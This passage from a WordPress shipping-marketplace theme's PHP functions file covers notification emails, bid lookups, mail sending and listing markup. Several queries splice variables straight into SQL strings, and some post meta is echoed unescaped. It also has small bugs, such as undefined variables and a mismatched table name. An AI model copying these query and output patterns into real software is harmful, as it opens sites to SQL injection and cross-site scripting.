 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));
 		$sndr			= get_userdata($sender_uid);

 		$find 		= array('##sender_username##', '##receiver_username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##');
    		$replace 	= array($sndr->user_login, $user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url);

 		$tag		= 'shipme_send_email_on_priv_mess_received';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		shipme_send_email($user->user_email, $subject, $message);

 	endif;
 }
 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/
 function shipme_prepare_rating($pid, $fromuser, $touser)
 {

 		global $wpdb;
 		$s = "insert into ".$wpdb->prefix."ship_ratings (pid, fromuser, touser) values('$pid','$fromuser','$touser')";
 		$wpdb->query($s);

 }



 function shipme_send_email_on_rated_user($pid, $rated_user_id)
 {
 	$enable 	= get_option('shipme_rated_user_email_enable');
 	$subject 	= get_option('shipme_rated_user_email_subject');
 	$message 	= get_option('shipme_rated_user_email_message');

 	if($enable != "no"):

 		$post 			= get_post($pid);
 		$user 			= get_userdata($rated_user_id);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));

 		global $wpdb;
 		$s = "select * from ".$wpdb->prefix."job_ratings where pid='$pid' AND touser='$rated_user_id'";
 		$r = $wpdb->get_results($s);
 		$row = $r[0];

 		$rating 		= ceil($row->grade/2);
 		$comment 		= $row->comment;

 		$find 		= array('##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##','##rating##','##comment##');
    		$replace 	= array($user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid),
 		$rating, $comment);

 		$tag		= 'shipme_send_email_on_rated_user';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------


 		shipme_send_email($user->user_email, $subject, $message);

 	endif;
 }

 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/
 function shipme_send_email_on_win_to_loser($pid, $loser_uid)
 {
 	$enable 	= get_option('shipme_won_job_loser_email_enable');
 	$subject 	= get_option('shipme_won_job_loser_email_subject');
 	$message 	= get_option('shipme_won_job_loser_email_message');

 	if($enable != "no"):

 		$post 			= get_post($pid);
 		$user 			= get_userdata($loser_uid);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));

 		$shipme_get_winner_bid = shipme_get_winner_bid($pid);

 		$usrnm = get_userdata($shipme_get_winner_bid->uid);
 		$winner_bid_username = $usrnm->user_login;
 		$winner_bid_value = shipme_get_show_price($shipme_get_winner_bid->bid);

 		$skk = shipme_get_bid_by_uid($pid, $loser_uid);

 		$user_bid_value 		= shipme_get_show_price($skk->bid);

 		$find 		= array('##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##',
 		'##user_bid_value##','##winner_bid_username##','##winner_bid_value##');
    		$replace 	= array($user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid),
 		$user_bid_value,$winner_bid_username,$winner_bid_value);

 		$tag		= 'shipme_send_email_on_win_to_loser';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		shipme_send_email($user->user_email, $subject, $message);

 	endif;
 }

 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/

 function shipme_get_winner_bid($pid)
 {
 	global $wpdb;
 	$s = "select * from ".$wpdb->prefix."ship_bids where pid='$pid' and winner='1'";
 	$r = $wpdb->get_results($s);

 	return $r[0];
 }


 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/


 function shipme_send_email_on_win_to_owner($pid, $winner_uid)
 {
 	$enable 	= get_option('shipme_won_job_owner_email_enable');
 	$subject 	= get_option('shipme_won_job_owner_email_subject');
 	$message 	= get_option('shipme_won_job_owner_email_message');

 	if($enable != "no"):

 		$post 			= get_post($pid);
 		$user 			= get_userdata($post->post_author);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));

 		$shipme_get_winner_bid = shipme_get_winner_bid($pid);

 		$usrnm = get_userdata($winner_uid);
 		$winner_bid_username = $usrnm->user_login;
 		$winner_bid_value = shipme_get_show_price($shipme_get_winner_bid->bid);

 		//--------------------------------------------------------------------------

 		$find 		= array('##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##','##winner_bid_value##','##winner_bid_username##');
    		$replace 	= array($user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid),
 		$winner_bid_value,$winner_bid_username );

 		$tag		= 'shipme_send_email_on_win_to_owner';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		shipme_send_email($user->user_email, $subject, $message);

 	endif;
 }
 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/
 function shipme_send_email_on_win_to_bidder($pid, $winner_uid)
 {
 	$enable 	= get_option('shipme_won_job_winner_email_enable');
 	$subject 	= get_option('shipme_won_job_winner_email_subject');
 	$message 	= get_option('shipme_won_job_winner_email_message');

 	if($enable != "no"):

 		$post 			= get_post($pid);
 		$user 			= get_userdata($winner_uid);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));

 		$shipme_get_winner_bid = shipme_get_winner_bid($pid);
 		$usrnm = get_userdata($winner_uid);
 		$winner_bid_username = $usrnm->user_login;
 		$winner_bid_value = shipme_get_show_price($shipme_get_winner_bid->bid);

 		$find 		= array('##username##', '##username_email##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##','##winner_bid_value##');
    		$replace 	= array($user->user_login, $user->user_email, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid), $winner_bid_value);

 		$tag		= 'shipme_send_email_on_win_to_bidder';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//--------------------------------------

 		shipme_send_email($user->user_email, $subject, $message);

 	endif;
 }

 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/
 function shipme_send_email_when_bid_job_bidder($pid, $uid, $bid)
 {
 	$enable 	= get_option('shipme_bid_job_bidder_email_enable');
 	$subject 	= get_option('shipme_bid_job_bidder_email_subject');
 	$message 	= get_option('shipme_bid_job_bidder_email_message');

 	if($enable != "no"):

 		$post 			= get_post($pid);
 		$user 			= get_userdata($uid);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));
 		$bid_val		= shipme_get_show_price($bid);

 		$find 		= array('##username##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##', '##bid_value##');
    		$replace 	= array($user->user_login, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid), $bid_val );


 		//---------------------------------------------

 		$tag		= 'shipme_send_email_when_bid_job_bidder';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );


 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		shipme_send_email($user->user_email, $subject, $message);

 	endif;
 }
 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/
 function shipme_send_email_when_bid_job_owner($pid, $uid, $bid)
 {
 	$enable 	= get_option('shipme_bid_job_owner_email_enable');
 	$subject 	= get_option('shipme_bid_job_owner_email_subject');
 	$message 	= get_option('shipme_bid_job_owner_email_message');



 	if($enable != "no"):

 		$bidder 		= get_userdata($uid);
 		$post 			= get_post($pid);
 		$user 			= get_userdata($post->post_author);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));
 		$bid_val		= shipme_get_show_price($bid);
 		$bidder_username = $bidder->user_login;
 		$author			= get_userdata($post->post_author);


 		$find 		= array('##username##', '##bid_value##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##', '##bidder_username##');
    		$replace 	= array($user->user_login, $bid_val, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid), $bidder_username);

 		$tag		= 'shipme_send_email_when_bid_job_owner';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		shipme_send_email($author->user_email, $subject, $message);

 	endif;
 }


 function shipme_send_email_when_on_completed_job($pid, $uid, $bid)
 {
 	$enable 	= get_option('shipme_payment_on_completed_job_enable');
 	$subject 	= get_option('shipme_payment_on_completed_job_subject');
 	$message 	= get_option('shipme_payment_on_completed_job_message');



 	if($enable != "no"):

 		$bidder 		= get_userdata($uid);
 		$post 			= get_post($pid);
 		$user 			= get_userdata($post->post_author);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));
 		$bid_val		= shipme_get_show_price($bid);
 		$bidder_username = $bidder->user_login;
 		$author			= get_userdata($post->post_author);


 		$find 		= array('##username##', '##bid_value##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##', '##bidder_username##');
    		$replace 	= array($user->user_login, $bid_val, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid), $bidder_username);

 		$tag		= 'shipme_send_email_when_on_completed_job';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		shipme_send_email($author->user_email, $subject, $message);

 	endif;
 }
 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/
 function shipme_send_email_posted_job_approved_admin($pid)
 {
 	$enable 	= get_option('shipme_new_job_email_approve_admin_enable');
 	$subject 	= get_option('shipme_new_job_email_approve_admin_subject');
 	$message 	= get_option('shipme_new_job_email_approve_admin_message');

 	$opt = get_post_meta($pid,'shipme_send_email_posted_job_approved_admin', true);

 	if($enable != "no" and empty($opt)):

 		update_post_meta($pid,'shipme_send_email_posted_job_approved_admin', '1');

 		$post 			= get_post($pid);
 		$user 			= get_userdata($post->post_author);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));


 		$find 		= array('##username##', '##username_email##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##');
    		$replace 	= array($user->user_login, $user->user_email, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid));

 		$tag		= 'shipme_send_email_posted_job_approved_admin';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		$email = get_bloginfo('admin_email');
 		shipme_send_email($email, $subject, $message);

 	endif;
 }

 function shipme_send_email_posted_job_not_approved_admin($pid)
 {
 	$enable 	= get_option('shipme_new_job_email_not_approved_admin_enable');
 	$subject 	= get_option('shipme_new_job_email_not_approved_admin_subject');
 	$message 	= get_option('shipme_new_job_email_not_approved_admin_message');

 	$opt = get_post_meta($pid,'shipme_send_email_posted_job_not_approved_admin', true);

 	if($enable != "no" and empty($opt)):

 		update_post_meta($pid,'shipme_send_email_posted_job_approved_admin2', '1');

 		$post 			= get_post($pid);
 		$user 			= get_userdata($post->post_author);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));


 		$find 		= array('##username##', '##username_email##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##');
    		$replace 	= array($user->user_login, $user->user_email, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $post->post_title, get_permalink($pid));

 		$tag		= 'shipme_send_email_posted_job_not_approved_admin';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		$email = get_bloginfo('admin_email');
 		shipme_send_email($email, $subject, $message);

 	endif;
 }
 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/





 function shipme_send_email_posted_job_not_approved($pid)
 {
 	$enable 	= get_option('shipme_new_job_email_not_approved_enable');
 	$subject 	= get_option('shipme_new_job_email_not_approved_subject');
 	$message 	= get_option('shipme_new_job_email_not_approved_message');

 	$opt = get_post_meta($pid,'shipme_send_email_posted_job_not_approved', true);

 	if($enable != "no" and empty($opt)):

 		update_post_meta($pid,'shipme_send_email_posted_job_not_approved', '1');
 		$post 			= get_post($pid);
 		$user 			= get_userdata($post->post_author);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));
 		$job_name 	= $post->post_title;

 		$find 		= array('##username##', '##username_email##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##');
    		$replace 	= array($user->user_login, $user->user_email, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $job_name, get_permalink($pid));

 		$tag		= 'shipme_send_email_posted_job_not_approved';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		$email = $user->user_email;
 		shipme_send_email($email, $subject, $message);

 	endif;

 }
 /*************************************************************
 *
 *	shipme (c) sitemile.com - function
 *
 **************************************************************/
 function shipme_send_email_posted_job_approved($pid)
 {
 	$enable 	= get_option('shipme_new_job_email_approved_enable');
 	$subject 	= get_option('shipme_new_job_email_approved_subject');
 	$message 	= get_option('shipme_new_job_email_approved_message');

 	$opt = get_post_meta($pid,'shipme_send_email_posted_job_approved', true);

 	if($enable != "no" and empty($opt)):

 		update_post_meta($pid,'shipme_send_email_posted_job_approved', '1');

 		$post 			= get_post($pid);
 		$user 			= get_userdata($post->post_author);
 		$site_login_url = shipme_login_url();
 		$site_name 		= get_bloginfo('name');
 		$account_url 	= get_permalink(get_option('shipme_my_account_page_id'));

 		$post 		= get_post($pid);
 		$job_name 	= $post->post_title;
 		$job_link 	= get_permalink($pid);

 		$find 		= array('##username##', '##username_email##', '##site_login_url##', '##your_site_name##', '##your_site_url##' , '##my_account_url##', '##job_name##', '##job_link##');
    		$replace 	= array($user->user_login, $user->user_email, $site_login_url, $site_name, get_bloginfo('siteurl'), $account_url, $job_name, $job_link);

 		$tag		= 'shipme_send_email_posted_job_approved';
 		$find 		= apply_filters( $tag . '_find', 	$find );
 		$replace 	= apply_filters( $tag . '_replace', $replace );

 		$message 	= shipme_replace_stuff_for_me($find, $replace, $message);
 		$subject 	= shipme_replace_stuff_for_me($find, $replace, $subject);

 		//---------------------------------------------

 		$email = $user->user_email;
 		shipme_send_email($email, $subject, $message);

 	endif;

 }


  function shipme_get_job_stars($rating)
 {
 	$full 	= get_bloginfo('template_url')."/images/full_star.gif";
 	$empty 	= get_bloginfo('template_url')."/images/empty_star.gif";

 	$r = '';

 	for($j=1;$j<=$rating;$j++)
 	$r .= '<img src="'.$full.'" />';


 	for($j=5;$j>$rating;$j--)
 	$r .= '<img src="'.$empty.'" />';

 	return $r;

 }

 function shipme_makeClickableLinks($s) {
   return preg_replace('@(https?://([-\w\.]+[-\w])+(:\d+)?(/([\w/_\.#-]*(\?\S+)?[^\.\s])?)?)@', '<a href="$1" target="_blank">$1</a>', $s);
 }

 function shipme_send_email($recipients, $subject = '', $message = '') {



 	$shipme_email_addr_from 	= get_option('shipme_email_addr_from');
 	$shipme_email_name_from  	= get_option('shipme_email_name_from');

 	$message = stripslashes($message);
 	$subject = stripslashes($subject);

 	$hh = array(
         'MIME-Version: 1.0',
         'Content-type: text/html; charset=' . get_bloginfo('charset'),
         sprintf( 'X-Mailer: PHP/%s', phpversion() ),
      );

 	if(empty($shipme_email_name_from)) $shipme_email_name_from  = "ShipMe Theme";
 	if(empty($shipme_email_addr_from)) $shipme_email_addr_from  = "shipme@wordpress.org";

 	$headers = 'From: '. $shipme_email_name_from .' <'. $shipme_email_addr_from .'>' . PHP_EOL;
 	$shipme_allow_html_emails = get_option('shipme_allow_html_emails');
 	if($shipme_allow_html_emails != "yes") $html = false;
 	else $html = true;

 	$oktosend = true;
 	$oktosend = apply_filters('shipme_ok_to_send_email',$oktosend);

 	if($oktosend)
 	{
 		if ($html) {

 			$message = shipme_makeClickableLinks($message);
 			$mailtext = "<html><head><title>" . $subject . "</title></head><body>" . nl2br($message) . "</body></html>";
 			return wp_mail($recipients, $subject, $mailtext); //, $hh);

 		} else {
 			$headers .= "MIME-Version: 1.0\n";
 			$headers .= "Content-Type: text/plain; charset=\"". get_bloginfo('charset') . "\"\n";
 			$message = preg_replace('|&[^a][^m][^p].{0,3};|', '', $message);
 			$message = preg_replace('|&amp;|', '&', $message);
 			$mailtext = wordwrap(strip_tags($message), 80, "\n");
 			return wp_mail($recipients, stripslashes($subject), stripslashes($mailtext)); //, $hh);
 		}

 	}

 }




 function SHIPME_new_mail_from($old) {

 	$shipme_email_addr_from = get_option('shipme_email_addr_from');
 	if(!empty($shipme_email_addr_from)) return $shipme_email_addr_from;

  return $old;
 }
 function SHIPME_new_mail_from_name($old) {

 	$shipme_email_name_from = get_option('shipme_email_name_from');
 	if(!empty($shipme_email_name_from)) return $shipme_email_name_from;

  return $old;
 }



  add_action( 'admin_init', 'shipme_CLASS_THM_my_plugin_admin_init' );

  function shipme_CLASS_THM_my_plugin_admin_init() {

 	    wp_enqueue_style('thickbox'); // call to media files in wp
 		wp_enqueue_script('thickbox');
 		wp_enqueue_script( 'media-upload');


     }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 add_filter('siteorigin_panels_settings_defaults','SH_siteorigin_panels_settings_defaults');

 function SH_siteorigin_panels_settings_defaults($arr)
 {
 	$arr['margin-bottom'] = 0;
 	return $arr;
 }

 function shipme_replace_stuff_for_me($find, $replace, $subject)
 {
 	$i = 0;
 	foreach($find as $item)
 	{
 		$replace_with = $replace[$i];
 		$subject = str_replace($item, $replace_with, $subject);
 		$i++;
 	}

 	return $subject;
 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_priv_mess_page_url($subpage = '', $id = '', $addon = '')
 {
 	$opt = get_option('shipme_private_messages_page_id');
 	if(empty($subpage)) $subpage = "home";

 	if($subpage == "delete-message")
 	{
 		if(!empty($_GET['rdr'])) $rdr = urlencode($_GET['rdr']);
 		else $rdr = urlencode(SH_curPageURL());
 	}

 	$perm = shipme_using_permalinks();

 	if($perm) return get_permalink($opt). "?rdr=".$rdr."&pg=".$subpage.(!empty($id) ? "&id=".$id : '').$addon;

 	return get_permalink($opt). "&rdr=".$rdr."&pg=".$subpage.(!empty($id) ? "&id=".$id : '').$addon;
 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_unread_number_messages($uid)
 {
 	global $wpdb;
 	$s = "select * from ".$wpdb->prefix."shipme_pm where user='$uid' and rd='0' AND show_to_destination='1'";
 				$r = $wpdb->get_results($s);
 				return count($r);

 }

 function shipme_due_unpaid_invoices($uid)
 {
    return 0;
 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function SH_curPageURL() {
  $pageURL = 'http';
  if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
  $pageURL .= "://";
  if ($_SERVER["SERVER_PORT"] != "80") {
   $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
  } else {
   $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
  }
  return $pageURL;
 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_rewrite_rules( $wp_rewrite )
 {

 		global $category_url_link;
 		global $raga_url_thing;

 		$new_rules = array(


 		$category_url_link.'/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$' => 'index.php?job_ship_cat='.$wp_rewrite->preg_index(1)."&feed=".$wp_rewrite->preg_index(2),
         $category_url_link.'/([^/]+)/(feed|rdf|rss|rss2|atom)/?$' => 'index.php?job_ship_cat='.$wp_rewrite->preg_index(1)."&feed=".$wp_rewrite->preg_index(2),
         $category_url_link.'/([^/]+)/page/?([0-9]{1,})/?$' => 'index.php?job_ship_cat='.$wp_rewrite->preg_index(1)."&paged=".$wp_rewrite->preg_index(2),
         $category_url_link.'/([^/]+)/?$' => 'index.php?job_ship_cat='.$wp_rewrite->preg_index(1),
 		$raga_url_thing.'/([^/]+)/([^/]+)/?$' => 'index.php?job_ship='.$wp_rewrite->preg_index(2),
 		'user-profile/([^/]+)/?$' => 'index.php?s_action=user_profile&driver_author='.$wp_rewrite->preg_index(1)



 		);

 		$wp_rewrite->rules = $new_rules + $wp_rewrite->rules;

 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_number_of_bid($pid)
 {
 	global $wpdb;
 	$s = "select bid from ".$wpdb->prefix."ship_bids where pid='$pid'";
 	$r = $wpdb->get_results($s);

 	return count($r);
 }


 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_bid_of_user($pid, $uid)
 {
 	global $wpdb;
 	$s = "select * from ".$wpdb->prefix."ship_bids where pid='$pid' and uid='$uid'";
 	$r = $wpdb->get_results($s);

 	if(count($r) == 0) return false;
  return $r[0];
 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_dimension_thing($value, $type)
 {
 	if($rtl) return $type.' '.$value;
 	return $value.' '.$type;
 }
  /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/

 function SHIPME_my_admin_notice() {

 	if(0) //!function_exists('siteorigin_panels_init'))
 	{

     ?>
     <div class="updated">
         <p><?php


 		$action = 'install-plugin';
 		$slug = 'siteorigin-panels';
 		$ss = wp_nonce_url(
 			add_query_arg(
 				array(
 					'action' => $action,
 					'plugin' => $slug
 				),
 				admin_url( 'update.php' )
 			),
 			$action.'_'.$slug
 		);

 		echo sprintf(__( 'In order to benefit of the full experience of our theme, we recommend installing <strong><a href="%s">this plugin</a></strong>. It will give you the "Page Builder" feature for your pages, and configure homepage as well.', 'shipme' ), $ss); ?></p>
     </div>
     <?php
 }

 	if(!function_exists('wp_pagenavi'))
 	{

     ?>
     <div class="updated">
         <p><?php


 		$action = 'install-plugin';
 		$slug = 'wp-pagenavi';
 		$ss = wp_nonce_url(
 			add_query_arg(
 				array(
 					'action' => $action,
 					'plugin' => $slug
 				),
 				admin_url( 'update.php' )
 			),
 			$action.'_'.$slug
 		);

 		echo sprintf(__( 'In order to benefit of the full experience of our theme, we recommend installing <strong><a href="%s">WP PageNavi Plugin</a></strong>. You will need it for pagination.', 'shipme' ), $ss); ?></p>
     </div>
     <?php
 }


 	if(!function_exists('bcn_display'))
 	{

     ?>
     <div class="updated">
         <p><?php


 		$action = 'install-plugin';
 		$slug = 'breadcrumb-navxt';
 		$ss = wp_nonce_url(
 			add_query_arg(
 				array(
 					'action' => $action,
 					'plugin' => $slug
 				),
 				admin_url( 'update.php' )
 			),
 			$action.'_'.$slug
 		);

 		echo sprintf(__( 'In order to benefit of the full experience of our theme, we recommend installing <strong><a href="%s">the Breadcrumb Plugin</a></strong>.', 'shipme' ), $ss); ?></p>
     </div>
     <?php
 }


 }

 add_action( 'admin_notices', 'SHIPME_my_admin_notice' );

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_first_post_image_fnc($pid, $w = 100, $h = 100)
 {



 	//---------------------
 	// build the exclude list
 	$exclude = array();

 	$args = array(
 	'order'          => 'ASC',
 	'post_type'      => 'attachment',
 	'post_parent'    => $pid,
 	'meta_key'		 => 'another_reserved1',
 	'meta_value'	 => '1',
 	'numberposts'    => -1,
 	'post_status'    => null,
 	);
 	$attachments = get_posts($args);
 	if ($attachments) {
 	    foreach ($attachments as $attachment) {
 		$url = $attachment->ID;
 		array_push($exclude, $url);
 	}
 	}

 	//-----------------

 	$args = array(
 	'order'          => 'ASC',
 	'orderby'        => 'post_date',
 	'post_type'      => 'attachment',
 	'post_parent'    => $pid,
 	'exclude'    		=> $exclude,
 	'post_mime_type' => 'image',
 	'post_status'    => null,
 	'numberposts'    => 1,
 	);
 	$attachments = get_posts($args);
 	if ($attachments) {
 	    foreach ($attachments as $attachment)
 	    {
 			$url = wp_get_attachment_url($attachment->ID);
 			return shipme_generate_thumb($attachment->ID, $w, $h);
 		}
 	}
 	else	return get_bloginfo('template_url').'/images/nopic.jpg';

 }

 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_first_post_image($pid, $w = 100, $h = 100)
 {
 	$img = shipme_get_first_post_image_fnc($pid, $w, $h);
 	$img = apply_filters('shipme_get_first_post_image_filter', $img, $pid, $w, $h);
 	return $img;

 }
 /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_table_head_thing()
 {
 	?>
         <div class="head_columns acc-s  zubs0">
     	 <div class="heds-area col-xs-12 col-sm-2 col-lg-2">   </div>
             <div class="heds-area  col-xs-12 col-sm-2 col-lg-2"><?php _e('Pickup','shipme') ?> </div>
              <div class="heds-area  col-xs-12 col-sm-2 col-lg-2"><?php _e('Delivery','shipme') ?></div>
              <div class="heds-area  col-xs-12 col-sm-2 col-lg-2"><?php _e('Budget','shipme') ?></div>
              <div class="heds-area  col-xs-12 col-sm-2 col-lg-2"><?php _e('Time Due','shipme') ?> </div>
     	</div>

     <?php
 }

  /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/

 function shipme_secondsToTime($seconds) {

 	if($seconds <0) return __('Closed/Expired','shipme');

     $dtF = new \DateTime('@0');
     $dtT = new \DateTime("@$seconds");
     return $dtF->diff($dtT)->format('%ad, %hh, %im');
 }
  /*****************************************************************************
 *
 *	Function - shipme -
 *
 *****************************************************************************/
 function shipme_get_regular_job_post_account_pending_job_owner($class_optional = '')
 {
 	$now = time();
 	$ending = get_post_meta(get_the_ID(),'ending',true);
 	$sec = $ending - $now;

 	$bid = shipme_get_winner_bid(get_the_ID());

 	?>
     	<div class="post-jb acc-s <?php echo $class_optional ?>" id="post-<?php the_ID() ?>">

         	<div class="title-area col-xs-12 col-sm-12 col-lg-12">
         		<a href="<?php the_permalink() ?>" title="<?php the_title() ?>"><?php the_title() ?></a>
             </div>

             <div class="picture-area col-xs-12 col-sm-2 col-lg-2">
             	<a href="<?php the_permalink() ?>"><img src="<?php echo shipme_get_first_post_image(get_the_ID(),70,70) ?>" class="img_img" width="70" /></a>
             </div>

             <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'pickup_location',true)); ?>
              </div>


              <div class="collection-del-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo (get_post_meta(get_the_ID(),'delivery_location',true)); ?>
              </div>



              <div class="price-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo shipme_get_show_price(get_post_meta(get_the_ID(),'price',true)); ?>
              </div>


              <div class="ending-area col-xs-12 col-sm-2 col-lg-2">
              	<?php echo __('Pending Job','shipme') ?>
              </div>


               <div class="button-area col-xs-12 col-sm-2 col-lg-2">
